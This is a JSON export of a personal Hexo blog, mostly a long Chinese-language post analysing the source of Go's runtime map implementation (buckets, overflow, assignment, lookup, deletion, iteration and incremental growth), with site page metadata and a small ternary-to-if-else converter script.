{"meta":{"title":"Hygao Blog","subtitle":null,"description":null,"author":"Hygao","url":"","root":"/"},"pages":[{"title":"404 Not Found","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"404.html","permalink":"/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"index.html","permalink":"/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"这个 正在读书&amp;&amp;热爱技术&amp;&amp;喜欢电影&amp;&amp;喜欢音乐 的人很懒，什么都没有留下"},{"title":"所有分类","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"我的友链","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"friends/index.html","permalink":"/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"三元表达式转if-else语句","date":"2022-12-29T05:40:57.525Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"tools/converter.html","permalink":"/tools/converter.html","excerpt":"","text":".tex { width: 100%; height:200px; overflow: 100%; border-radius: 5px; } .btn { text-align: center; width: 100%; height: 30px; font-size: 100%; background-color: rgb(100,200,255); color: rgb(255,255,255); border-radius: 5px; } 转换时的分隔符为 ? 与 : 两个符号，请确保两者不会出现在诸如字符串一类的特殊地方 转换时以小括号作为分组依据，故无法处理一对括号外侧带有无关字符的情况 若在使用中遇到什么问题或您有什么好的建议，欢迎和我交流 Translate tex = document.querySelector('#tex'); btn = document.querySelector('.btn'); rlt = document.querySelector('#rlt'); btn.onclick = ()=>{ rlt.focus(); let tmp = tex.value.split(' ').join(''); rlt.value = ''; function getSplitContent(tmp) { let balance = 0; let indexs = []; let words = []; for (let i=0; i"},{"title":"杂项","date":"2022-12-29T05:40:57.529Z","updated":"2022-12-29T05:40:57.529Z","comments":true,"path":"tools/index.html","permalink":"/tools/index.html","excerpt":"","text":"这是一个随心所欲的地方，不定期投放各种奇怪的东西 把三元表达式转换成if-else语句的小玩意 图灵机Demo版"}],"posts":[{"title":"浅析 golang map 源码","slug":"golang-map-src","date":"2022-12-26T14:32:34.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/12/26/golang-map-src/","link":"","permalink":"/2022/12/26/golang-map-src/","excerpt":"","text":"前言最近阅读了 runtime/map.go 中的代码，以梳理 golang 中 map 这个数据结构的原理。在使用上，map 有很多内置的语法支持，但实际上这些都是 golang 提供的语法糖，这些语法在编译时都会被编译器转换为对 runtime/map.go 或其变种的函数调用，并添加一些代码，最终完成用户需要的功能。 本文尝试分析 map.go 中的代码对 map 各种操作的支持，其他变种的操作与此类似。 基础结构golang 中 map 的核心结构有如下几个： 1234567891011121314151617181920212223242526272829303132333435363738// A header for a Go map.type hmap struct &#123; count int // map 中当前有多少个元素，len() 方法读的就是这里 flags uint8 // 当前 map 的 flag，用于标识 map 的状态，比如是否有在写入或是遍历 B uint8 // loadFactor * 2^B 是当前 map 可以容纳的元素数量 noverflow uint16 // “可能”用了多少个溢出桶 hash0 uint32 // hash 函数的种子，引入更多的随机性 buckets unsafe.Pointer // 2^B 个桶，桶也就是 bmap oldbuckets unsafe.Pointer // 保存迁移前的桶 nevacuate uintptr // 当前有多少个桶被迁移了 extra *mapextra // optional fields&#125;// mapextra holds fields that are not present on all maps.type mapextra struct &#123; // If both key and elem do not contain pointers and are inline, then we mark bucket // type as containing no pointers. This avoids scanning such maps. // However, bmap.overflow is a pointer. In order to keep overflow buckets // alive, we store pointers to all overflow buckets in hmap.extra.overflow and hmap.extra.oldoverflow. // overflow and oldoverflow are only used if key and elem do not contain pointers. // overflow contains overflow buckets for hmap.buckets. // oldoverflow contains overflow buckets for hmap.oldbuckets. // The indirection allows to store a pointer to the slice in hiter. overflow *[]*bmap oldoverflow *[]*bmap // nextOverflow holds a pointer to a free overflow bucket. nextOverflow *bmap&#125;// A bucket for a Go map.type bmap struct &#123; // 桶中元素的 hash 的高八位，加速查找，bucketCnt 当前取值为 8 tophash [bucketCnt]uint8 // 后面其实是 key*8 与 value*8，但因为编译前不知道具体类型，所以需要用指针的方式来访问&#125; 本质上讲，代码中的一个 map 变量其实是 *hmap 类型，所以如果我们把这三个结构复制到自己的代码里，然后用下面的代码就可以访问 hmap 结构中的各个字段了： 1234567mp := map[int]int&#123;&#125;for i := 0; i &lt; 10; i++ &#123; mp[i] = i&#125;mpPtr := *(**hmap)(unsafe.Pointer(&amp;mp))fmt.Printf(\"%+v\\n\", mpPtr) 基本原理对于一个 map 而言，核心需求是能够根据一个 key 来增删改查对应的 value，这需要将 value 保存在槽（hash slot）里，在访问时先对 key 来进行 hash 计算，计算的结果会是一个数字，然后把这个数字对槽的数量取模，这样就可以获知 value 在哪个槽中。但槽的数量是有限的，尽管优秀的 hash 函数能够使计算结果尽可能分散到不同的槽中，当保存的 value 数量大于槽的总数时还是不可避免地会让多个 value 进入同一个槽中，对于这种名为“哈希冲突”的问题，常见的解法是“开放地址法”和“拉链法”。 golang 中的 map 采用了同样的思路，具体来说，map 中存在 2^B（B 是大于等于 0 的数字） 个 bmap 结构，这些 bmap 被放在一块连续的内存中，也就是一个数组，每个 bmap 中保存 8 个键值对。 给定一个 key，首先会通过 hash 函数来计算得到一个 uintptr 类型的值（在 64 位的系统上占 8 个字节），然后将这个值与 2^B - 1 做与运算，就可以得到 bmap 数组的下标。这里的与运算其实是前文取模的一种优化，因为 bmap 的数量是 2 的整数次幂，那么这个值减一就会得到一个低 B 位均为 1 的数，这时对这个数做与运算时就可以拿到 [0, 2^B) 中的一个值，而这个值的取值范围与 bmap 数组的下标范围相同。 而 bmap 中首先的 8 个字节是名为 tophash 的数组，与其内部的键值对一一对应。这个值的计算方式被定义在 tophash 函数 中，取的是 hash 函数结果的高 8 位，但由于 部分值被保留用于标识一些状态，所以需要按需绕过这些值。有了这些 tophash，就可以在读取时先对比 tophash，当且仅当 bmap 中某个 tophash 的值与入参对应的 tophash 相等时再进一步比较对应的 key 与入参的 key 是否相等，这就避免了一些复杂结构的频繁判等。 而 bmap 结构本身其实并不单单是前文贴出的代码中的样子，它除了 8 个 tophash 外还包含 8 个 key、8 个对应的 value 以及一个 bmap 的指针。在不考虑内存对齐的情况下，golang 在运行时会为每一个 bmap 分配 8 + 8*sizeof(key) + 8*sizeof(value) + sizeof(uintptr) 大小的内存，从这个算式中可以发现，sizeof(key) 和 sizeof(value) 都是仅在编译时才能确定的，所以 bmap 本身的结构中仅包含 tophash，其他三个字段都是在运行时直接通过指针来访问的。为了验证这一点，我们可以为上面的 bmap 结构按实际情况填充一些字段，然后就可以用下面的代码来访问这个 bmap 中的各个值了： 12345678910111213141516171819202122// ... 省略 hmap 和 mapextra 结构type bmap struct &#123; // bucketCnt 取值为 8 tophash [bucketCnt]uint8 // 填充具体的 keys、values 以及 ptr keys [bucketCnt]string vals [bucketCnt]string ptr *bmap&#125;func main() &#123; mp := map[string]string&#123; \"hello\": \"world\", &#125; mpPtr := *(**hmap)(unsafe.Pointer(&amp;mp)) fmt.Println(\"len:\", mpPtr.count) bucket := (*bmap)(mpPtr.buckets) fmt.Printf(\"%+v\\n\", bucket)&#125; 如果运行上面的代码，就可以直接在 bucket 的 keys 和 vals 中看到 “hello” 和 “world”，但是并不是所有的 key 和 val 都可以直接放在 bmap 中，golang 在源码中定义了 maxKeySize 和 maxElemSize，当 key 或 val 的大小大于这个值时，就会只在 bmap 中保存对应的指针，这样就避免了 bmap 过大的问题。 那么这个 ptr，就是是结尾的 bmap 指针是用来做什么的呢？这是用来链接溢出桶（overflow bucket）的。具体而言，golang 中的 map 是采用“拉链法”来解决 hash 冲突的，而这里的 ptr 是用来实现拉链的。如前所述，一个 bmap 只能保存 8 个键值对，而且这 8 个键值对 hash(key) &amp; (2^B - 1) 的值是相等的（也就是当前 bmap 的下标）。那么如果此时有一个 bmap，它内部已经拥有了 8 个键值对，而新增的第 9 个 key 算出的下标和这个已有 8 个键值对的 bmap 下标相同，就需要在这个 bmap 后面添加新的 bmap 结构才能将这个键值对保存下来。此时原有的 bmap 中的 ptr 就会指向这个新的 bmap 结构。 所以，hmap.buckets 其实可以看作是一个二维的 bmap 数组，第一维的下标通过哈希函数加与运算的方式来获取，而第二维则是一个链表，链表中所有 key 的 hash(key) &amp; (2^B - 1) 的值都是相同的。在读写 bmap 时，首先计算出第一维的下标，然后遍历这个下标对应的链表，在链表的某个节点上做具体的增删改查。 虽然拉链法能够在存储上解决哈希冲突的问题，但任由拉链越来越长会严重影响 map 的访问效率，极端情况下会退化成一条链表（写入的所有 key 计算出的下标都相同）。而之所以会造成这个问题，本质在于 bmap 的数量会限制 hash 函数的值范围（因为会对数量取模），较小的值范围会让更多的 hash(key) 落在同一个桶中。所以就需要在 map 中保存的值达到一定数量时对 map 做扩容，通过增加 bmap 的数量来为 hash 函数提供更大的值范围。那么怎样确定这个数量呢？是通过 overLoadFactor 函数 来确定的，具体而言，当 hmap.count 大于一个 bmap 中能保存的数量时，需要判断 hmap.count / 2^B 是否大于 6.5，这里的 6.5 被称为负载因子（load factor），当比值大于这个值时，overLoadFactor 返回 true，此时就需要进行扩容（其实扩容的条件不止负载因子这一个，详细的内容放在下面的小节中）。 扩容的操作就是创建一个新的 bmap 数组，这个数组要在数学意义上更适应当前键值对的数量，然后把键值对从旧的 bmap 数组中迁移到新的数组中。不难想到，当 map 中的键值对数量很多时，这个操作会非常耗性能。所以 golang 的 map 采用了“渐进式扩容”的方式，将扩容操作分摊到每一次的写入和删除操作中，每次只迁移一部分的数据。这样解决了全量扩容带来的瞬间性能问题，但却引入了迁移中间态，也就是在某些时间点，map 有一部分数据在新的 bmap 数组，有一部分还留在旧的数组中，所以在读写时就需要兼容这一点，具体的方式在下面的内容中会讨论到。 总结而言，golang 中的 map 用 hmap 来保存多个 bmap，而具体的键值对被保存在 bmap 中，每个 bmap 对应 hash 函数的一个结果，当某个 bmap 中的键值对满了但需要在这个 bmap 中新增键值对时，会通过“拉链法”在 bmap 之后链接一个新的 bmap 结构。而为了保证 map 的访问效率，还需要适时对 map 进行渐进式的扩容。 那么下面我们就来通过源码了解一下各个操作的具体逻辑。 初始化golang 中可以通过字面量或 make 方法来创建一个 map，但字面量的初始化方式会被转换为 make 与循环赋值的方式，所以最终的初始化还是由 make 来做的。另一方面，如果 map 可以分配在栈上且其容量小于 8 时，编译器会直接创建一个 hmap 的结构并为其赋初值。 当代码中使用 make 来创建 map 时，最终会调用 runtime.makemap 函数 或其变种，我们这里仅分析 makemap 函数。由于 map 的本质是一个 hmap 的指针，所以 makemap 函数的最终目的就是创建一个 hmap 结构并按需为其填充字段。其中 hmap.hash0 通过 fastrand 函数来初始化，这个值会作为后面 hash 函数的一部分来为其引入更多的随机性。紧随其后的是对 hmap.B 的初始化，通过循环调用 overLoadFactor 函数 来找到一个最小能容纳 hint 个元素的 B 值，然后将其赋值给 hmap.B 字段。 根据 overLoadFactor 的定义可以得知，如果 hint 小于等于 bucketCnt（也就是 8），那么 B 就会取为 0，此时并不会创建 bmap 结构，而是等第一次赋值时才进行初始化。与之相对的，如果 hmap.B 不为 0，那么就会调用 makeBucketArray 函数 来创建 bmap 数组，这个函数返回数组的首地址以及可能存在的溢出桶地址。 具体来看 makeBucketArray 函数中的逻辑，首先通过 bucketShift(b) 计算出 hmap.B 代表的 bmap 的数量，然后将这个值分别赋值给 base 和 nbuckets 变量，此时两个变量的值相等。然后判断 hmap.B 的值，如果大于等于 4，那么认为后面会使用溢出桶的概率比较高，此时会为 nbuckets 增加 2^(hmap.B-4) ，由于 nbuckets 才是最终创建的 bmap 数组的长度，所以此时创建的 bmap 的数量是大于所需数量的，多出来的这部分就作为未来会使用的溢出桶。 也就是说，最终创建的 bmap 数组中会有 nbuckets 个元素，其中前 2^B 个元素是正常的 bmap，而后 nbuckets - 2^B 个元素是作为溢出桶的 bmap。为了方便访问溢出桶，就需要记录一下溢出桶的位置，这也就是 makeBucketArray 函数的第二个返回值。如果 bmap 数组中存在溢出桶，那么 nbuckets 和 base 变量就不再相等，其中 base 的值就是正常 bmap 的数量，也就是 2^B。所以在 makeBucketArray 的 最后 判断了两个变量是否相等，如果不相等，那么算出第一个溢出桶的地址，将这个地址赋值给 hmap.extra 并返回给调用者。同时，会通过 bmap.setoverflow 函数 将 bmap 中最后一个溢出桶的 ptr 指向第一个 bmap，而由于创建 bmap 数组时是申请了对应大小的内存并填充 0 在里面，所以整个 bmap 数组中除最后一个溢出桶外的所有 bmap.ptr 都是 nil，这就把最后一个溢出桶与其他的 bmap 结构区分开了，这个区分的作用留到后面的小节来讨论。 此外，我们前面提到，bmap.tophash 中有一些值被用作了保留项，可以看到 0 对应的含义 是“这个槽是空的且后面没有更多的数据了”，而由于 bmap 内部在初始化时所有的字节都是 0，所以就在初始化时直接达成了这个保留项的目的。 写入golang 中对 map 进行写入时的代码类似于 map[key] = val，这个语句在编译时会被替换成对 runtime.mapassign 函数 的调用，这个函数接收 key 的指针并返回 val 的地址，拿到地址后通过编译器加入的赋值语句完成对 map 中字段的赋值。 首先，golang 中的 map 是不支持并发读写的，这一点在代码里也做了一定的保证，具体来说，hmap.flags 字段中的各个位记录了 map 的各种状态，其中右边数第三位被称为 hashWriting，在写入和删除操作中会通过异或的方式 设置这个标记位，并在结束后 取消这个标记位。如果在写入和读取时发现这个标记位已经被设置，那么就会直接 panic。为了复现这一点也很简单，只要创建两个 goroutine 对同一个 map 做读写即可。 然后，mapassign 函数会通过 hasher 函数计算入参的 key 对应的哈希值，如前所述，这个值是 uintptr 类型。 紧接着是判断 hmap.buckets 字段是否为 nil，在前面讨论 makemap 的逻辑中曾提到，如果创建时传递的大小不超过 bucketCnt，那么 hmap.B 的值为 0，此时并不会创建 hmap.buckets 结构，直到第一次对其赋值，也就是调用 mapassign 时才会做延迟创建，从 mapassign 的代码中也印证了这一点。 如果不考虑扩容的逻辑，那么 mapassign 的核心逻辑其实和前面讨论基本原理时提到的一样，会用 hash 函数结果的低位作为 bmap 的下标，高八位作为 tophash 来查找 bmap，如果一个 bmap 中找不到且有溢出桶，那么到溢出桶里继续寻找，如果找不到，那么就是新增的 key，此时要在 bmap 中新增一个键值对并增加 hmap.count 结构，如果能找到，那么就是要修改的 key，此时返回对应的 value 的地址，然后由编译器插入的语句来完成值的更新。这样看来，键值对在 bmap 中是顺序写入的，所以如果在读取时遇到了 emptyRest，也就是 0 这个特殊值，那么就可以认为这个 bmap 之后不会有数据了，此时就可以直接停止遍历。 遍历溢出桶的方式很简单，其实和遍历链表的逻辑相同，只要一直找到 hmap.ptr 为 nil 即可。但新增溢出桶则麻烦一些，如果当前 bmap 链表已经满了，但是需要在这个链表中增加新的键值对时，就需要分配一个新的溢出桶并放在链表的尾部，在代码中这是通过 hmap.newoverflow 函数 来 实现 的。 这个函数会判断 hmap.extra 是否为 nil，前面分析 map 初始化时我们曾讨论过，如果提前分配了溢出桶，那么这个字段就不会为 nil，此时判断 hmap.extra.nextOverflow 字段，这个值会作为指针指向下一个可用的溢出桶，如果这个值不为 nil，那么其指向的 bmap 就可以直接返回给调用者，否则说明没有更多的溢出桶，需要新申请一块内存并返回。 当有可用的溢出桶时，还要进一步判断 hmap.extra.nextOverflow.overflow() 是否为 nil，前面讨论 map 初始化时我们提到过，最后一个溢出桶的这个值不是 nil，所以如果这个 overflow 函数返回了非 nil，那么就说明当前调用返回的 bmap 就是最后一个溢出桶了。 几经曲折拿到一个可用的 bmap 结构后，需要调用 hmap.incrnoverflow 函数 来增加 hmap.noverflow，从代码中可以发现这个增加并非是准确的，当 hmap.B &gt;= 16 时会采样自增，但是这没有什么问题，因为这个值其实只用来判断是否需要扩容，而采样自增还是全量自增对这个判断的影响不大。 在 newoverflow 函数的最后，这个新获得的 bmap 会被链接在入参的 bmap 之后，这个入参是当前 bmap 链表的最后一个元素，经过这个链接后，新获取的 bmap 会取而代之成为最后一个元素。 读取golang 中对 map 的读取有两种方式，分别是 val := map[key] 和 val, ok := map[key]，其中后者除了返回 val 或零值外还会返回一个 bool 值用于标识 map 内部是否存在这个 key。这两种访问方式会被编译器分别转换为对 runtime.mapaccess1 函数 与 runtime.mapaccess2 函数 的调用，粗略扫一下这两个函数的代码可以发现，它们的结构其实是相同的，不同点在于后者会返回 bool 值表示 key 是否存在，不清楚为什么 mapaccess1 没有通过直接调用 mapaccess2 来实现。 这里仅分析 mapaccess2 的代码，首先判断 hmap.count 是否为 0，如果为 0，那么不需要计算 hash 也不需要遍历 bmap 就可以知道内部一定不存在 key。而如果 hmap.count 不为 0，则继续判断 hmap.flags 的 hashWriting 标记位是否被设置过，正如前面讨论写入时曾提到过，如果这个标记位被设置，那么当前 map 正在被某个 goroutine 进行写操作。回过来，如果 hashWriting 被设置了，那么直接 panic 退出。 后面的逻辑与写入时的 mapassign 差不多，先根据 hash 函数结果的低位判断 bmap 的下标，然后用高八位做 tophash，遍历该下标下的 bmap 链表，遍历的过程中先比较 tophash，如果相等则进一步判断 key 是否相等，当 key 也相等时就取出对应 value 的地址并返回。此外，前面讨论 map 的写入时我们曾提到，键值对在 bmap 中是顺序写入的，所以如果在读取中 遇到了 emptyRest，那么就可以直接停止遍历，直接返回没有这个键值对。 删除golang 中从 map 中删除某个 key 的方式是 delete(map, key)，这个函数不会返回任何内容，如果被删除的 key 不在对应的 map 里也不会有什么问题。在实现上，delete 函数会被编译器转换为对 runtime.mapdelete 函数 的调用，从函数的签名上也可以看到，该函数不会返回任何内容，这与 delete 的行为一致。 mapdelete 首先会判断 hmap.count 字段，如果其为 0，那么直接退出流程，因为此时不会有任何 key 会被删除。然后，mapdelete 会判断 hmap.flags 的 hashWriting 标记位，因为删除也是一种写操作。再之后的流程就和写入与读取相同，遍历 hmap.buckets 中的 bmap 结构尝试找到待删除的键值对，如果找到则将对应的 key 和 value 的内存清零，然后将对应的 tophash 设置为 emptyOne，这个标记与 emptyRest 不同，它仅仅表示当前的 tophash 以及对应的键值对是可以写入的，而 emptyRest 同时还表示这个 tophash 及之后都没有键值对了。 如果一个键值对被删除，那么它的 tophash 会被设置为 emptyOne，但如果被删除的是最后一个键值对，即在这个键值对之后没有其他的数据了，那么就需要将它的 tophash 设置为 emptyRest，这个值的含义在上面已经讨论过了。而一旦有 tophash 被设置为 emptyRest，就需要进一步判断相邻的前一个 tophash 是否是 emptyOne，如果有则将前面的相邻的所有 emptyOne 都设置为 emptyRest。mapdelete 中用一个 for 循环 来做这件事，它不断地向前处理 emptyOne，当前 bmap 处理结束后就去处理链表中的前一个 bmap，直到没有 emptyOne。这样才能维持 emptyRest 的语义，保证读写时的效率。 处理完 tophash 后，就需要将 hmap.count 减小一位，然后在 map 中没有元素，即 hmap.count 为 0 时重置 hmap.hash0，使下一次的同一个 key 算出来的 hash 和上次不同，进一步提高了 map 的随机性。最后，mapdelete 再次判断 hmap.flags 的 hashWriting，如果没有并发读写问题，就将其清零。 通读 mapdelete 后我们可以发现，它并没有 bmap 的清理逻辑，即便一个溢出桶中所有的 tophash 都是 emptyRest，这个 bmap 也不会被清理掉。虽然这使得 bmap 链表的长度没有随着删除而减少，但这其实并不怎么影响读写的效率，因为 emptyRest 可以让 bmap 链表的遍历提前终止，而 mapdelete 维护了 emptyRest 的语义。另一方面，不清理 bmap 使得后续再写入溢出桶时不需要再分配新的内存，这进一步提高了写操作的效率。但过长的 bmap 链表是内存不友好的，所以 map 引入了新的机制来保证溢出桶的数量不会太多，这个机制就是扩容操作，我们在后面的小节会进行讨论。 遍历这里的遍历指的就是 for-range 操作，具体来说，是 for key, val := range map、 for key := range map以及 for range map。这些操作会被编译器展开为类似如下的代码： 123456hit := hiter&#123;&#125;mapiterinit(maptype, hmap, &amp;hit)for ; hit.key != nil; mapiternext(&amp;hit) &#123; key := *hit.key val := *hit.val&#125; 上面代码中 for 循环内部的 key 和 val 是与 for-range 等式左边的变量一一对应的，所以如果只有 key 的话那么 for 循环内部也只有 key，没有变量时情况与此类似。 继续分析上面生成的代码，核心在于 hiter 类型以及 mapiterinit 函数 与 mapiternext 函数，先看一下 hiter 类型的定义，这里给出各个字段的注释，在两个功能函数中会用到它们： 1234567891011121314151617type hiter struct &#123; key unsafe.Pointer // 本次循环中获取到的 key，如果为 nil 那么结束遍历 elem unsafe.Pointer // 本次循环中获取到的 val，如果为 nil 那么结束遍历 t *maptype // 内部有当前 map 的类型信息，由于 mapiternext 没有像 mapiterinit 一样接收这个参数，所以需要将它保存到 hiter 中直接被 mapiternext 使用 h *hmap // 被遍历的 map，保存在这里的作用同 t 字段 buckets unsafe.Pointer // 调用 mapiterinit 时的 hmap.buckets bptr *bmap // 调用 mapiternext 时需要被遍历的 bmap，包括溢出桶 overflow *[]*bmap // 调用 mapiterinit 时的 hmap.extra.overflow oldoverflow *[]*bmap // 调用 mapiterinit 时的 hmap.extra.oldoverflow startBucket uintptr // 被选为第一个遍历的 bmap，是一个下标 offset uint8 // 遍历 bmap 时从第几个键值对开始 wrapped bool // 是否已经遍历了一圈，当遍历的 bmap 回到 startBucket 时，如果 wrapped 为 true 那么结束遍历 B uint8 // 调用 mapiterinit 时的 hmap.B i uint8 // 调用 mapiternext 时需要被遍历的 bmap 中键值对的下标，会与 offset 字段配合 bucket uintptr // 调用 mapiternext 时需要被遍历的下一个 bmap 链表的下标 checkBucket uintptr // 与扩容有关&#125; 然后继续看上面的 for 循环，为了保证第一次循环时 hit 中已经有 key 和 val 了，可以猜测 mapiterinit 内部或者直接对 key 和 val 进行了赋值，或者调用了 mapiterinit，从代码中可以看到是 后者。下面就一一分析一下这两个函数。 首先来看 mapiterinit，在函数的开始判断了 hmap.count 是否为 0，如果为 0 那么直接 return，此时 hiter 的 key 和 elem 字段都是 nil，回到上面被编译器生成的代码中，可以发现如果 key 为 nil，那么整个 for-range 就会结束。 然后，mapiterinit 会根据入参来填充 hiter 中的各个字段，其中 startBucket 和 offset 是随机选择的，这两个字段用于指引 mapiternext 从哪里开始遍历键值对，正是因为在这里引入了随机性，所以每次遍历同一个 map 得到的键值对顺序都可能是不同的。反过来说，如果把 startBucket 和 offset 都设置成 0，然后构建一个长度为 8 的 map，那么每次遍历拿到的键值对序列都会相同。 在 mapiterinit 的最后会给 hmap.flags 设置 iterator 和 oldIterator 两个标记位，然后进一步调用 mapiternext，尝试填充 key 和 elem 两个字段，第一次调用 mapiternext 时，一定会拿到一对不为 nil 的键值对。 map 的 for-range 也被认为是一种读操作，所以 mapiternext 的一开始就判断了 hmap.flags 的 hashWriting 标记位，如果这个标记位被设置过，那么表示存在并发读写，此时会直接 panic。然后 mapiternext 就开始遍历这个 map，每次找到一个键值对后就将上下文保存在 hiter 中方便下一次 mapiternext 被调用时来使用这些信息，然后将这次找到的键值对赋值到 hiter 上，这样编译器生成的代码就可以直接从 hiter.key 和 hiter.elem 中获取所需的内容。 在遍历的过程中，hiter.bptr 记录了正在遍历的 bmap，这个 bmap 从第 hiter.offset 个键值对开始，检查所有的键值对后判断是否有溢出桶，如果有的话将 hiter.bptr 指向溢出桶，那么下次调用 mapiternext 时就会从新的 bmap 中遍历返回键值对，新的 bmap 也是从第 hiter.offset 个键值对开始的。在 mapiternext 中不能通过检查 tophash 是否为 emptyRest 来决定是否直接结束遍历，因为 hiter.offset 很可能使最开始遍历的 tophash 不是第一个，所以即便遇到了 emptyRest，也要至少把当前这个 bmap 遍历完才可以。 而 hiter.wrapped 则记录了 bmap 数组中的最后一个 bmap 是否被遍历过，所以如果当前需要遍历的 bmap 数组的下标是 hiter.startBucket，并且 hiter.wrapped 为 true 的话，那么就可以判断所有的键值对都被遍历过，此时直接将 hiter.key 和 hiter.elem 赋值为 nil，这样编译器生成的代码就会命中 for 循环的结束条件，从而结束整个循环过程。 虽然 for-range 的过程结束了，但不论是 mapiterinit 还是 mapiternext 都没有清理 hmap.flags 中的 iterator 和 oldIterator 标记位，事实上，这两个标记的清理是在扩容阶段做的。 扩容扩容的目的有两个，第一是在保存的键值对数量大于一定量时，哈希冲突的问题会变得频繁，此时需要增加 bmap 的数量来扩大哈希函数的取值范围；第二是当溢出桶太多时，需要重新设置键值对在 bmap 中的布局，让它们排列得更紧凑，这样一方面减少溢出桶的数量从二降低内存压力，一方面能加速遍历 bmap 链表，因为 emptyOne 在重排列后会消失。这两个扩容策略分别对应代码中的 overLoadFactor 函数 和 tooManyOverflowBuckets 函数。 正如前面在基本原理中讨论的，map 的扩容是渐进式的，会被分摊到各次的写操作中，且因为引入了“扩容中”的状态，所以读操作也要对它做一些兼容。 扩容操作的触发点在 mapassign 函数中，如前所述，就是对 map 进行赋值时，更具体来说是向 map 中增加新的键值对时。hmap.growing 函数 是一个谓词函数，通过判断 hmap.oldbuckets 是否为 nil 来获知当前的 map 是否在扩容中，如果没有在扩容，且新增一个 key 后不满足负载因子的条件或有太多的溢出桶，那么就会调用 hashGrow 函数 进行扩容，扩容后会用 goto again 重新执行 mapassign 的逻辑。下面我们就一起来看下 hashGrow 这个函数的代码，然后再看看执行过这个函数后 mapassign 的流程会有什么不同。 hashGrow 首先区分了扩容的触发原因，如果是因为有太多的溢出桶，那么会分配与原来长度相同的新的 bmap 数组，并设置 hmap.flags 的 sameSizeGrow 标记位，否则会创建原来两倍大小的 bmap 数组。然后判断 hmap.flags 是否设置过 iterator 标记位，这个标记是在 for-range 的 mapiterinit 函数中设置的，如果设置过，那么清除 iterator，只保留 oldIterator。在这之后，将新的状态更新到 hmap 中，包括新的 B、新的 flags ，更重要的，旧的 bmap 数组会被赋值给 hmap.oldbuckets 中，而 hmap.buckets 会保存新申请的 bmap 数组，虽然此时所有的键值对都在旧数组中。 hashGrow 函数执行后，hmap 结构上就有了两个 bmap 数组，在数据迁移完成之前，此时的 map 是处于“扩容中”的状态的，这使得对该 map 的读写都要有一些兼容的地方。首先来看 mapassign 函数，hashGrow 被调用后会重新执行 mapassign 的逻辑，因为 mapassign 只有新增键值对时才会触发扩容，而 hashGrow 调用后新的 bmap 数组中没有任何数据，此时如果向其中写入新的键值对，那么会对迁移操作造成影响。 那么 mapassign 在当前 map 处于“扩容中”时会做什么呢？答案是 调用growWork 函数。在调用时传递了当前的 hmap 结构以及 mapassign 要写入的 bmap 的下标，这个函数的逻辑非常简单，首先用入参的下标计算对应的扩容前的下标，然后用这个计算的下标调用了一次 evacuate 函数，然后如果当前 map 仍在扩容中，那么用 hmap.nevacuate 再调用一次 evacuate。之所以要再判断一下是否在扩容，是因为很可能第一次的 evacuate 就完成了整个 map 的扩容。 evacuate 的代码虽然比较长，但是核心逻辑也很简单，如果传递的下标对应的 bmap 链表还没有迁移，那么执行迁移，否则跳过这部分逻辑。每次调用 evacuate 时如果要迁移，那么会将入参下标对应的整个 bmap 链表迁移完，执行迁移时会区分当前是否为 sameSizeGrow，如果是的话那么直接将旧链表中所有有效的数据迁移到新链表中，然后将旧链表中的 tophash 设置为 evacuatedEmpty 或 evacuatedX；如果不是 sameSizeGrow，那么说明新的 bmap 数组的长度是旧数组的两倍，此时在迁移键值对时会计算 hash(key) &amp; 2^hmap.B 的值，由于 hmap.B 已经增加了一，那么这个与运算得到的结果会比原来的结果多一个最高位，如果这一位为 1，那么将这个键值对到 下标 + 2^(hmap.B-1) 的 bmap 链表并设置 tophash 为 evacuatedY，否则迁移到下标对应的 bmap 链表并设置 tophash 为 evacuatedX。 在 evacuate 的最后，会判断入参的下标是否与 hmap.nevacuate 相等，如果相等那么调用 advanceEvacuationMark 函数，这个函数的主要作用在于调整 hmap.nevacuate 的状态以及判断扩容是否完成。对于 hmap.nevacuate 的更新，由于 hashGrow 内部调用了两次 evacuate，第一次传递的下标是随机的，所以 hmap.nevacuate 之后可能有很多 bmap 链表已经完成迁移了，advanceEvacuationMark 每次最多会检查 1024 个链表，也就是说 hmap.nevacuate 每次最多增加 1024，实际迁移的链表数量是可能大于这个值的。而一旦 hmap.nevacuate 的值与旧 map 的长度相等，那么说明这个 map 的所有键值对都完成迁移，此时将 hmap.oldbuckets 设置为 nil，让 hmap.growing 返回 false。 以上就是 map 扩容的逻辑，现在回过头来看下读写操作对扩容的兼容。首先是 mapassign，如前所述，当决定了要写入的 bmap 链表的下标时，如果当前 map 在扩容，那么会用这个下标调用 growWork 来完成对应的旧链表的迁移。growWork 结束后，新的链表中就有了迁移后的紧凑的数据，自此 map 的扩容不会再对这个链表造成影响，所以对这个链表正常执行 mapassign 的逻辑即可。 与 mapassign 类似，mapdelete 作为另一种写操作，也会按需调用 growWork 来完成待删除键值对所在 bmap 链表的迁移，调用后也只需要正常对新链表执行 mapdelete 的逻辑，因为此后 map 的扩容不会再对这个链表造成影响。 和写操作不同，读操作并不会按需执行 growWork，所以它们对扩容的支持相对麻烦一些，首先来看 mapaccess2（mapaccess1 的逻辑与此相同，这里不在赘述），这个函数读取了 hmap.oldbuckets 是否为 nil，如果不为 nil，那么就说明当前 map 处于扩容中（与 hmap.gorwing 是一个道理），此时从 oldbuckets 中获取 hash 对应的旧的 bmap 结构，然后判断这个 bmap 是否完成迁移，如果没有完成，那么就把这个 bmap 赋值给 b 变量，此后的读逻辑就会到这个 bmap 对应的链表中查找所需的 key。 另一个读操作是 map 的遍历，具体的逻辑在 mapiternext 函数中。由于“在遍历 map 